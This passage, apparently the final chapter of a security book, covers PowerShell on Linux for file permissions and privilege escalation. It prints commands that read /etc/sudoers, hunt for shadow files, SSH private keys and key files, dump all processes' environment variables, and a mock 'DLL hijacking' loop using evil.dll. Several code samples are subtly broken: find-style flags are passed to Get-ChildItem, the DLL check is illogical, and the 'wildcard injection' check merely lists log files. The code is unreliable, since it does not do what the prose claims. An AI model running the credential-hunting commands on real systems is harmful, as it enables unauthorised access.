<h2 id="_idParaDest-538"><a id="_idTextAnchor536"/><span class="koboSpan" id="kobo.251.1">Checking effective permissions</span></h2>
<p><span class="koboSpan" id="kobo.252.1">PowerShell </span><a id="_idIndexMarker1027"/><span class="koboSpan" id="kobo.253.1">on Linux can check the effective permissions for a user on a file. </span><span class="koboSpan" id="kobo.253.2">Take the </span><span class="No-Break"><span class="koboSpan" id="kobo.254.1">following example:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.255.1">
# Check effective permissions for a user
$filePath = "/path/to/document.pdf"
$user = "guest"
(Get-Acl $filePath).Access | Where-Object { $_.IdentityReference -eq $user }</span></pre> <p><span class="koboSpan" id="kobo.256.1">This </span><a id="_idIndexMarker1028"/><span class="koboSpan" id="kobo.257.1">command retrieves the effective permissions for the user </span><strong class="source-inline"><span class="koboSpan" id="kobo.258.1">guest</span></strong><span class="koboSpan" id="kobo.259.1"> on the </span><span class="No-Break"><span class="koboSpan" id="kobo.260.1">specified file.</span></span></p>
<h2 id="_idParaDest-539"><a id="_idTextAnchor537"/><span class="koboSpan" id="kobo.261.1">Inheriting permissions</span></h2>
<p><span class="koboSpan" id="kobo.262.1">PowerShell </span><a id="_idIndexMarker1029"/><span class="koboSpan" id="kobo.263.1">can be used to configure permissions to be inherited by child objects. </span><span class="koboSpan" id="kobo.263.2">An example is configuring a directory to inherit permissions from </span><span class="No-Break"><span class="koboSpan" id="kobo.264.1">its parent:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.265.1">
# Configure directory to inherit permissions
$directoryPath = "/path/to/folder"
$acl = Get-Acl $directoryPath
$acl.SetAccessRuleProtection($false, $true)
Set-Acl $directoryPath $acl</span></pre> <p><span class="koboSpan" id="kobo.266.1">This script disables the directory’s protection and allows it to inherit permissions from </span><span class="No-Break"><span class="koboSpan" id="kobo.267.1">its parent.</span></span></p>
<h2 id="_idParaDest-540"><a id="_idTextAnchor538"/><span class="koboSpan" id="kobo.268.1">Checking Access Control Lists (ACLs)</span></h2>
<p><span class="koboSpan" id="kobo.269.1">PowerShell </span><a id="_idIndexMarker1030"/><span class="koboSpan" id="kobo.270.1">on Linux can list all </span><strong class="bold"><span class="koboSpan" id="kobo.271.1">Access Control Entries</span></strong><span class="koboSpan" id="kobo.272.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.273.1">ACEs</span></strong><span class="koboSpan" id="kobo.274.1">) in an </span><a id="_idIndexMarker1031"/><span class="koboSpan" id="kobo.275.1">ACL. </span><span class="koboSpan" id="kobo.275.2">Take the </span><span class="No-Break"><span class="koboSpan" id="kobo.276.1">following example:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.277.1">
# List all ACEs in an ACL
$filePath = "/path/to/data.txt"
(Get-Acl $filePath).Access</span></pre> <p><span class="koboSpan" id="kobo.278.1">This command retrieves and displays all ACEs in the ACL for the specified file. </span><span class="koboSpan" id="kobo.278.2">While native Linux commands such as </span><strong class="source-inline"><span class="koboSpan" id="kobo.279.1">chmod</span></strong><span class="koboSpan" id="kobo.280.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.281.1">chown</span></strong><span class="koboSpan" id="kobo.282.1">, and </span><strong class="source-inline"><span class="koboSpan" id="kobo.283.1">getfacl</span></strong><span class="koboSpan" id="kobo.284.1"> are typically used to manage file permissions, PowerShell on Linux offers a consistent scripting experience, especially in heterogeneous environments. </span><span class="koboSpan" id="kobo.284.2">Security professionals should consider their Linux systems’ specific context and requirements when choosing between native tools and PowerShell for file </span><span class="No-Break"><span class="koboSpan" id="kobo.285.1">permission management.</span></span></p>
<h1 id="_idParaDest-541"><a id="_idTextAnchor539"/><span class="koboSpan" id="kobo.286.1">Using PowerShell for privilege escalation in Linux</span></h1>
<p><span class="koboSpan" id="kobo.287.1">PowerShell, traditionally associated with Windows environments, has expanded its reach to </span><a id="_idIndexMarker1032"/><span class="koboSpan" id="kobo.288.1">Linux systems with PowerShell Core. </span><span class="koboSpan" id="kobo.288.2">While Linux typically relies on native tools and scripting languages such as Bash </span><a id="_idIndexMarker1033"/><span class="koboSpan" id="kobo.289.1">for privilege escalation, PowerShell on Linux can be a powerful addition to the toolkit of security professionals. </span><span class="koboSpan" id="kobo.289.2">This guide will explore how PowerShell can be used for privilege escalation on Linux through various techniques </span><span class="No-Break"><span class="koboSpan" id="kobo.290.1">and examples.</span></span></p>
<h2 id="_idParaDest-542"><a id="_idTextAnchor540"/><span class="koboSpan" id="kobo.291.1">Checking the current user’s privileges</span></h2>
<p><span class="koboSpan" id="kobo.292.1">Before </span><a id="_idIndexMarker1034"/><span class="koboSpan" id="kobo.293.1">attempting privilege escalation, it’s essential to understand the current user’s privileges. </span><span class="koboSpan" id="kobo.293.2">PowerShell on Linux can retrieve information about the </span><span class="No-Break"><span class="koboSpan" id="kobo.294.1">current user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.295.1">
# Check current user's privileges
whoami</span></pre> <p><span class="koboSpan" id="kobo.296.1">This simple command provides the current user’s username, allowing initial insight into </span><span class="No-Break"><span class="koboSpan" id="kobo.297.1">their privileges.</span></span></p>
<h2 id="_idParaDest-543"><a id="_idTextAnchor541"/><span class="koboSpan" id="kobo.298.1">Enumerating local groups and users</span></h2>
<p><span class="koboSpan" id="kobo.299.1">Identifying </span><a id="_idIndexMarker1035"/><span class="koboSpan" id="kobo.300.1">local groups and users is a crucial step in privilege escalation. </span><span class="koboSpan" id="kobo.300.2">PowerShell can be used to enumerate local groups and </span><span class="No-Break"><span class="koboSpan" id="kobo.301.1">their members:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.302.1">
# Enumerate local groups and their members
Get-LocalGroup | ForEach-Object {
    $group = $_
    Write-Host "Group: $($group.Name)"
    Get-LocalGroupMember -Group $group.Name
}</span></pre> <p><span class="koboSpan" id="kobo.303.1">This </span><a id="_idIndexMarker1036"/><span class="koboSpan" id="kobo.304.1">script lists all local groups and their members, helping identify potential targets for </span><span class="No-Break"><span class="koboSpan" id="kobo.305.1">privilege escalation.</span></span></p>
<h2 id="_idParaDest-544"><a id="_idTextAnchor542"/><span class="koboSpan" id="kobo.306.1">Checking sudo configuration</span></h2>
<p><span class="koboSpan" id="kobo.307.1">Examining </span><a id="_idIndexMarker1037"/><span class="koboSpan" id="kobo.308.1">the sudo configuration is vital for identifying opportunities to execute commands with elevated privileges. </span><span class="koboSpan" id="kobo.308.2">PowerShell can be used to view the </span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.309.1">sudoers</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.310.1"> file:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.311.1">
# Check sudoers file
cat /etc/sudoers</span></pre> <p><span class="koboSpan" id="kobo.312.1">This command displays the contents of the </span><strong class="source-inline"><span class="koboSpan" id="kobo.313.1">sudoers</span></strong><span class="koboSpan" id="kobo.314.1"> file, revealing the configuration of users and commands with </span><span class="No-Break"><span class="koboSpan" id="kobo.315.1">sudo privileges.</span></span></p>
<h2 id="_idParaDest-545"><a id="_idTextAnchor543"/><span class="koboSpan" id="kobo.316.1">Checking executable file permissions</span></h2>
<p><span class="koboSpan" id="kobo.317.1">Identifying </span><a id="_idIndexMarker1038"/><span class="koboSpan" id="kobo.318.1">executable files with lax permissions provides opportunities for privilege escalation. </span><span class="koboSpan" id="kobo.318.2">PowerShell can be used to search for files with the </span><span class="No-Break"><span class="koboSpan" id="kobo.319.1">executable permission:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.320.1">
# Find executable files with lax permissions
Get-ChildItem -Path / -type f -executable | ForEach-Object {
    $file = $_
    Write-Host "Executable File: $($file.FullName)"
}</span></pre> <p><span class="koboSpan" id="kobo.321.1">This script searches for executable files and lists those with potentially </span><span class="No-Break"><span class="koboSpan" id="kobo.322.1">weak permissions.</span></span></p>
<h2 id="_idParaDest-546"><a id="_idTextAnchor544"/><span class="koboSpan" id="kobo.323.1">Exploiting weak service configurations</span></h2>
<p><span class="koboSpan" id="kobo.324.1">Some </span><a id="_idIndexMarker1039"/><span class="koboSpan" id="kobo.325.1">services may have misconfigurations that can be exploited for privilege escalation. </span><span class="koboSpan" id="kobo.325.2">PowerShell can help identify services and </span><span class="No-Break"><span class="koboSpan" id="kobo.326.1">their configurations:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.327.1">
# Check for services with weak configurations
Get-Service | ForEach-Object {
    $service = $_
    Write-Host "Service: $($service.DisplayName), StartType: $($service.StartType)"
}</span></pre> <p><span class="koboSpan" id="kobo.328.1">This script lists services and their start types, allowing for the identification of services </span><span class="No-Break"><span class="koboSpan" id="kobo.329.1">with misconfigurations.</span></span></p>
<h2 id="_idParaDest-547"><a id="_idTextAnchor545"/><span class="koboSpan" id="kobo.330.1">Exploiting crontab entries</span></h2>
<p><span class="koboSpan" id="kobo.331.1">Cron jobs </span><a id="_idIndexMarker1040"/><span class="koboSpan" id="kobo.332.1">can be manipulated for privilege escalation. </span><span class="koboSpan" id="kobo.332.2">PowerShell can be used to list and analyze </span><span class="No-Break"><span class="koboSpan" id="kobo.333.1">cron jobs:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.334.1">
# List cron jobs
crontab -l</span></pre> <p><span class="koboSpan" id="kobo.335.1">This command displays the </span><strong class="source-inline"><span class="koboSpan" id="kobo.336.1">cron</span></strong><span class="koboSpan" id="kobo.337.1"> jobs for the current user, providing insights into scheduled tasks that might </span><span class="No-Break"><span class="koboSpan" id="kobo.338.1">be exploited.</span></span></p>
<h2 id="_idParaDest-548"><a id="_idTextAnchor546"/><span class="koboSpan" id="kobo.339.1">Exploiting world-writable directories</span></h2>
<p><span class="koboSpan" id="kobo.340.1">Directories </span><a id="_idIndexMarker1041"/><span class="koboSpan" id="kobo.341.1">with world-writable permissions may offer opportunities for privilege escalation. </span><span class="koboSpan" id="kobo.341.2">PowerShell can be used to identify </span><span class="No-Break"><span class="koboSpan" id="kobo.342.1">such directories:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.343.1">
# Find world-writable directories
Get-ChildItem -Path / -type d | Where-Object { $_.Attributes -match "OtherWrite" } | ForEach-Object {
    $dir = $_
    Write-Host "World-Writable Directory: $($dir.FullName)"
}</span></pre> <p><span class="koboSpan" id="kobo.344.1">This </span><a id="_idIndexMarker1042"/><span class="koboSpan" id="kobo.345.1">script identifies directories with world-writable permissions, which could be exploited for </span><span class="No-Break"><span class="koboSpan" id="kobo.346.1">privilege escalation.</span></span></p>
<h2 id="_idParaDest-549"><a id="_idTextAnchor547"/><span class="koboSpan" id="kobo.347.1">DLL hijacking</span></h2>
<p><span class="koboSpan" id="kobo.348.1">DLL hijacking </span><a id="_idIndexMarker1043"/><span class="koboSpan" id="kobo.349.1">involves manipulating the search path for dynamic link libraries. </span><span class="koboSpan" id="kobo.349.2">PowerShell can be used to identify processes that might be vulnerable to </span><span class="No-Break"><span class="koboSpan" id="kobo.350.1">DLL hijacking:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.351.1">
# Identify processes with DLL hijacking potential
Get-Process | ForEach-Object {
    $process = $_
    $dllPath = Join-Path $process.MainModule.FileName -ChildPath "evil.dll"
    if (-not (Test-Path $dllPath)) {
        Write-Host "Potential DLL hijacking found in $($process.ProcessName). </span><span class="koboSpan" id="kobo.351.2">Exploiting..."
</span><span class="koboSpan" id="kobo.351.3">    }
}</span></pre> <p><span class="koboSpan" id="kobo.352.1">This script checks each running process for potential DLL hijacking opportunities and alerts if any </span><span class="No-Break"><span class="koboSpan" id="kobo.353.1">are found.</span></span></p>
<h2 id="_idParaDest-550"><a id="_idTextAnchor548"/><span class="koboSpan" id="kobo.354.1">Password files and sensitive information</span></h2>
<p><span class="koboSpan" id="kobo.355.1">Searching </span><a id="_idIndexMarker1044"/><span class="koboSpan" id="kobo.356.1">for password files or sensitive information is a common privilege escalation tactic. </span><span class="koboSpan" id="kobo.356.2">PowerShell can be used to look for </span><span class="No-Break"><span class="koboSpan" id="kobo.357.1">specific files:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.358.1">
# Search for password files
Get-ChildItem -Path / -type f -name "passwd*" -or -name "shadow" -or -name "sudoers" -or -name "id_rsa" -or -name "id_dsa" -or -name "*.key"</span></pre> <p><span class="koboSpan" id="kobo.359.1">This </span><a id="_idIndexMarker1045"/><span class="koboSpan" id="kobo.360.1">script searches for files commonly associated with passwords or </span><span class="No-Break"><span class="koboSpan" id="kobo.361.1">sensitive information.</span></span></p>
<h2 id="_idParaDest-551"><a id="_idTextAnchor549"/><span class="koboSpan" id="kobo.362.1">Exploiting wildcard injection</span></h2>
<p><span class="koboSpan" id="kobo.363.1">Wildcards </span><a id="_idIndexMarker1046"/><span class="koboSpan" id="kobo.364.1">in commands might lead to unintended consequences. </span><span class="koboSpan" id="kobo.364.2">PowerShell can be used to check for wildcard </span><span class="No-Break"><span class="koboSpan" id="kobo.365.1">injection vulnerabilities:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.366.1">
# Check for wildcard injection vulnerabilities
Get-ChildItem -Path / -include "*.log*" -Recurse</span></pre> <p><span class="koboSpan" id="kobo.367.1">This script searches for files with names matching the pattern </span><strong class="source-inline"><span class="koboSpan" id="kobo.368.1">.log</span></strong><span class="koboSpan" id="kobo.369.1"> and can help identify potential wildcard </span><span class="No-Break"><span class="koboSpan" id="kobo.370.1">injection vulnerabilities.</span></span></p>
<h2 id="_idParaDest-552"><a id="_idTextAnchor550"/><span class="koboSpan" id="kobo.371.1">Exploiting setuid and setgid binaries</span></h2>
<p><strong class="source-inline"><span class="koboSpan" id="kobo.372.1">setuid</span></strong><span class="koboSpan" id="kobo.373.1"> and </span><strong class="source-inline"><span class="koboSpan" id="kobo.374.1">setgid</span></strong><span class="koboSpan" id="kobo.375.1"> binaries </span><a id="_idIndexMarker1047"/><span class="koboSpan" id="kobo.376.1">execute with </span><a id="_idIndexMarker1048"/><span class="koboSpan" id="kobo.377.1">the privileges of the file owner. </span><span class="koboSpan" id="kobo.377.2">PowerShell can be used to find </span><span class="No-Break"><span class="koboSpan" id="kobo.378.1">such binaries:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.379.1">
# Find setuid and setgid binaries
find / -type f -perm /4000 -or -perm /2000 2&gt;/dev/null</span></pre> <p><span class="koboSpan" id="kobo.380.1">This command lists </span><strong class="source-inline"><span class="koboSpan" id="kobo.381.1">setuid</span></strong><span class="koboSpan" id="kobo.382.1"> and </span><strong class="source-inline"><span class="koboSpan" id="kobo.383.1">setgid</span></strong><span class="koboSpan" id="kobo.384.1"> binaries, potentially providing opportunities for </span><span class="No-Break"><span class="koboSpan" id="kobo.385.1">privilege escalation.</span></span></p>
<h2 id="_idParaDest-553"><a id="_idTextAnchor551"/><span class="koboSpan" id="kobo.386.1">Exploiting environment variables</span></h2>
<p><span class="koboSpan" id="kobo.387.1">Environment </span><a id="_idIndexMarker1049"/><span class="koboSpan" id="kobo.388.1">variables can influence program behavior. </span><span class="koboSpan" id="kobo.388.2">PowerShell can be used to inspect </span><span class="No-Break"><span class="koboSpan" id="kobo.389.1">environment variables:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.390.1">
# Check environment variables
Get-ChildItem -Path /proc/*/environ -type f | ForEach-Object {
    $envContents = Get-Content $_.FullName
    Write-Host "Environment Variables in $($_.FullName):"
    Write-Host $envContents
}</span></pre> <p><span class="koboSpan" id="kobo.391.1">This script retrieves the contents of environment variable files in the </span><strong class="source-inline"><span class="koboSpan" id="kobo.392.1">/proc</span></strong><span class="koboSpan" id="kobo.393.1"> directory, helping identify variables that might </span><span class="No-Break"><span class="koboSpan" id="kobo.394.1">be exploited.</span></span></p>
<p><span class="koboSpan" id="kobo.395.1">PowerShell </span><a id="_idIndexMarker1050"/><span class="koboSpan" id="kobo.396.1">on Linux provides security professionals with a cross-platform scripting language that can be used alongside native Linux tools for privilege escalation. </span><span class="koboSpan" id="kobo.396.2">While traditional Linux commands and scripting languages are often preferred, PowerShell’s consistency across platforms makes it a valuable addition to the toolkit for security assessments and penetration testing on mixed environments. </span><span class="koboSpan" id="kobo.396.3">Security professionals should consider the specific context of their Linux systems and choose the most appropriate tools and techniques for privilege escalation based on </span><span class="No-Break"><span class="koboSpan" id="kobo.397.1">the environment.</span></span></p>
<p><span class="koboSpan" id="kobo.398.1">With this, we have come to the end of this book. </span><span class="koboSpan" id="kobo.398.2">Congratulations on successfully completing </span><span class="No-Break"><span class="koboSpan" id="kobo.399.1">this book!</span></span></p>
</div>
</body></html>